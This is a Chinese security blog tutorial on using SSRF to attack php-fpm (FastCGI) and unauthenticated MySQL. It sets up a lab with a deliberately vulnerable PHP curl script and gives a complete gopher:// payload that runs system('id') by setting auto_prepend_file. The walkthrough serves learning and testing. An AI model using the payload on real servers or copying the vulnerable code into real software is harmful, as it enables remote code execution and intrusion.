@@ -1,0 +1,472 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>利用SSRF渗透内网主机·中 | Ulysses'Blog</title><meta name="keywords" content="SSRF"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSRF攻击FastCGI执行命令FastCGI与PHP-FPMFastCGI快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使[服务器可以同时处理更多的网页请求。 众所周知，在网站分类中存在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用SSRF渗透内网主机·中">
+<meta property="og:url" content="https://plumeria.ltd/post/ecd40306.html">
+<meta property="og:site_name" content="Ulysses&#39;Blog">
+<meta property="og:description" content="SSRF攻击FastCGI执行命令FastCGI与PHP-FPMFastCGI快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使[服务器可以同时处理更多的网页请求。 众所周知，在网站分类中存在">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://plumeria.ltd/img/cover/ssrf2.png">
+<meta property="article:published_time" content="2021-12-02T14:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-02T09:22:53.783Z">
+<meta property="article:author" content="Ulysses">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://plumeria.ltd/img/cover/ssrf2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/ecd40306"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"0HPLBDYHPG","apiKey":"0c8875d1d08e28840a882f41ae37ed2e","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '利用SSRF渗透内网主机·中',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-02 17:22:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/ssrf2.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">利用SSRF渗透内网主机·中</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-02T14:00:00.000Z" title="发表于 2021-12-02 22:00:00">2021-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-02T09:22:53.783Z" title="更新于 2021-12-02 17:22:53">2021-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">SSRF服务端请求伪造</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="利用SSRF渗透内网主机·中"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SSRF攻击FastCGI执行命令"><a href="#SSRF攻击FastCGI执行命令" class="headerlink" title="SSRF攻击FastCGI执行命令"></a>SSRF攻击FastCGI执行命令</h2><h3 id="FastCGI与PHP-FPM"><a href="#FastCGI与PHP-FPM" class="headerlink" title="FastCGI与PHP-FPM"></a>FastCGI与PHP-FPM</h3><h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h4><p><strong>快速通用网关接口</strong>（<strong>Fast</strong> <strong>C</strong>ommon <strong>G</strong>ateway <strong>I</strong>nterface／<strong>FastCGI</strong>）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使[服务器可以同时处理更多的网页请求。</p>
+<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的(一个内容对应一个页面)，而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。</p>
+<p><strong>浏览器访问静态网页过程</strong></p>
+<p>在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/jg4Ur7So8LD2QBf.jpg" alt="img"></p>
+<p><strong>浏览器访问动态网页过程</strong></p>
+<p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/onQ2BR4gIOLZixu.jpg" alt="img"></p>
+<p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
+<p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。</p>
+<h4 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h4><p>了解了CGI和FastCGI之后，我们来看一下什么是php-fpm，官方对它的解释是<strong>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</strong></p>
+<p>也就是说php-fpm是FastCGI的一个具体实现，并且提供了进程管理的功能，在其中的进程中，包含了master和worker进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中master 进程负责与 Web 服务器进行通信，接收 HTTP 请求，再将请求转发给 worker 进程进行处理，<strong>worker 进程主要负责动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p>
+<h3 id="PHP-FPM攻击实现原理"><a href="#PHP-FPM攻击实现原理" class="headerlink" title="PHP-FPM攻击实现原理"></a>PHP-FPM攻击实现原理</h3><p>想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理</a>这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p>
+<p>而在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。</p>
+<p>那么当设置php环境变量为:<code>auto_prepend_file = php://input;allow_url_include = On</code>,就会在执行php脚本之前包含<code>auto_prepend_file</code>文件的内容,<code>php://input</code>也就是POST的内容,这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="安装环境与依赖"><a href="#安装环境与依赖" class="headerlink" title="安装环境与依赖"></a>安装环境与依赖</h4><p>这里直接在Ubuntu上安装Nginx和php-fpm，首先安装Nginx</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>
+<p>安装php、php-fpm以及一些插件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common python-software-properties </span><br><span class="line">sudo add-apt-repository ppa:ondrej/php          <span class="comment">#这里容易卡死,解决方法使用代理</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install php7.2</span><br><span class="line">sudo -y apt-get install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2-xml  php7.2-intl </span><br></pre></td></tr></table></figure>
+<h4 id="配置php-fpm"><a href="#配置php-fpm" class="headerlink" title="配置php-fpm"></a>配置php-fpm</h4><p>修改配置监听9000端口来处理nginx的请求</p>
+<p>打开<code>/etc/php/7.2/fpm/pool.d/www.conf</code>文件找到如下位置注释第一行添加第二行</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;listen = /run/php/php7.2-fpm.sock</span></span><br><span class="line"><span class="attr">listen</span> = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：这里如果设置监听为0.0.0.0:9000就在产生php-fpm未授权访问漏洞，此时攻击者可以直接与9000端口上的php-fpm进行通信，进而可以实现任意代码执行。</p>
+</blockquote>
+<p>下面修改权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /run/php/php7.2-fpm.sock</span><br></pre></td></tr></table></figure>
+<p>打开nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 修改相应部分的配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80<span class="comment">; #监听80端口，接收http请求</span></span><br><span class="line">    server_name  hacktop.com<span class="comment">; #就是网站地址</span></span><br><span class="line">    root /usr/share/nginx/html/<span class="comment">; # 准备存放代码工程的路径</span></span><br><span class="line">    <span class="comment">#路由到网站根目录www.example.com时候的处理</span></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.php<span class="comment">; #跳转到www.example.com/index.php</span></span><br><span class="line">        autoindex on<span class="comment">;</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">#当请求网站下php文件的时候，反向代理到php-fpm</span></span><br><span class="line">   location ~ \.php$ &#123;</span><br><span class="line">            root html<span class="comment">;</span></span><br><span class="line">            fastcgi_split_path_info ^(.+\.php)(/.+)$<span class="comment">;</span></span><br><span class="line">            fastcgi_pass        127.0.0.1:9000<span class="comment">;</span></span><br><span class="line">            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name<span class="comment">;</span></span><br><span class="line">            fastcgi_index       index.php<span class="comment">;</span></span><br><span class="line">            include             fastcgi_params<span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><p>配置完成后查看一下php-fpm的安装位置，然后启动</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/Qapy8URsukYBEvb.png" alt="image-20211201132107539"></p>
+<p>重新启动Nginx</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure>
+<p>然后检查nginx是否正确启动 <code>systemctl status nginx</code></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/4RfhY6kMr8nsejq.png" alt="image-20211201132738682"></p>
+<p>检查php-fpm是否正确启动 <code>ps -elf | grep php-fpm</code></p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/MFr8GUbTiwAladE.png" alt="image-20211201132859864"></p>
+<p>这里就可以看出上面所说的存在一个master进程和多个worker进程</p>
+<p>下面将<code>/usr/share/nginx/html/</code>（nginx Web目录）下的文件删除，新建一个index.php。</p>
+<p>内容可以写上<code>&lt;?php phpinfo(); ?&gt;</code>用来检查各项是否正常运行，如果页面为空，查看这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/feiniao8651/article/details/52768911">文章</a>解决。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/fzoOswx7UDTQPcB.png" alt="image-20211201133404402"></p>
+<p>其中Sever API 处和上图一样说明运行正确，然后在目录下新建ssrf.php 内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curl</span> = curl_init(<span class="variable">$url</span>);    </span><br><span class="line">    <span class="comment">//第二种初始化curl的方式</span></span><br><span class="line">    <span class="comment">//$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*进行curl配置*/</span></span><br><span class="line">    curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出HTTP头</span></span><br><span class="line">    <span class="variable">$responseText</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="comment">//var_dump(curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$responseText</span>;</span><br><span class="line">    curl_close(<span class="variable">$curl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该代码为一个ssrf漏洞的示例代码，可以访问<code>/ssrf.php?url=http://www.baidu.com</code>进行测试，若能实现跳转到百度的页面，或包含百度的页面即SSRF环境搭建成功</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/g5UJGaymtFPMCLB.png" alt="image-20211201133950257"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在这里就直接使用Gopherus生成payload</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/zCbsJtucid5ZGjW.png" alt="image-20211201134731583"></p>
+<p>对生成的payload再次进行URL编码，放入URL参数浏览器请求如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hacktop.com/ssrf.php?url=gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%250C%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%251FSCRIPT_FILENAME/usr/share/nginx/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>
+<p>成功执行命令</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/12/01/yE3IvaucLhPk8xt.png" alt="image-20211201135040353"></p>
+<h2 id="SSRF利用MySQL未授权攻击"><a href="#SSRF利用MySQL未授权攻击" class="headerlink" title="SSRF利用MySQL未授权攻击"></a>SSRF利用MySQL未授权攻击</h2><h3 id="MySQL通信协议"><a href="#MySQL通信协议" class="headerlink" title="MySQL通信协议"></a>MySQL通信协议</h3><h4 id="MySQL连接方式"><a href="#MySQL连接方式" class="headerlink" title="MySQL连接方式"></a>MySQL连接方式</h4><p>MySQL分为服务端和客户端，客户端连接服务器使存在三种方法：</p>
+<blockquote>
+<ul>
+<li>Unix套接字</li>
+<li>内存共享/命名管道</li>
+<li>TCP/IP套接字</li>
+</ul>
+</blockquote>
+<ul>
+<li>在Linux或者Unix环境下，当我们输入<code>mysql –uroot –proot</code>登录MySQL服务器时就是用的Unix套接字连接；Unix套接字其实不是一个网络协议，只能在客户端和Mysql服务器在同一台电脑上才可以使用。</li>
+<li>在Windows系统中客户端和Mysql服务器在同一台电脑上，可以使用命名管道和共享内存的方式。</li>
+<li><code>TCP/IP</code>套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入<code>mysql –h127.0.0.1 –uroot –proot</code>时就是要TCP/IP套接字。所以当我们需要抓取mysql通信数据包时必须使用<code>TCP/IP</code>套接字连接。</li>
+</ul>
+<h4 id="MySQL认证过程"><a href="#MySQL认证过程" class="headerlink" title="MySQL认证过程"></a>MySQL认证过程</h4><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
+<p>MySQL客户端与服务器的交互主要分为两个阶段：<code>Connection Phase</code>（连接阶段或者叫认证阶段）和<code>Command Phase</code>（命令阶段）。在连接阶段包括握手包和认证包，这里我们不详细说明握手包，主要关注认证数据包。</p>
+<h3 id="漏洞利用-查询数据库"><a href="#漏洞利用-查询数据库" class="headerlink" title="漏洞利用-查询数据库"></a>漏洞利用-查询数据库</h3><p><strong>实验环境：</strong></p>
+<blockquote>
+<p>系统：Ubuntu 20.04.3 LTS</p>
+<p>数据库：MariaDB 10.3.31</p>
+<p>（mysql没有实验成功，可能是版本的问题）</p>
+</blockquote>
+<h4 id="配置空密码用户"><a href="#配置空密码用户" class="headerlink" title="配置空密码用户"></a>配置空密码用户</h4><p>首先我们需要配置一个空密码的用户</p>
